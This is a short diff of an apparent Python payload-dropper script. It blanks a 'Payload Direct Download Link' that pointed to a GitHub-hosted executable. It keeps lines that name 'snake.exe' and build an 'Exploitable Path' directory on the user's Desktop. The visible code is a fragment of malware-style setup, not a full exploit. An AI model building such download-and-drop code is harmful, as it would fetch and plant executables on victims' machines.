@@ -4,7 +4,7 @@ from shutil import move
 import os
 from os import getlogin as getlogin, system as system, makedirs as makedirs
 
-replink = "https://github.com/xemulat/Basic-Redists/releases/download/1/basic.redists.exe"    #Payload Direct Download Link
+replink = ""    #Payload Direct Download Link
 repname = "snake.exe"   #DO NOT TOUCH
 pyload = "C:/Users/" + getlogin() + "/Desktop/404"  #Exploitable Path (Can Be Changed!)
 makedirs(pyload)    #Make Exploitable Directory
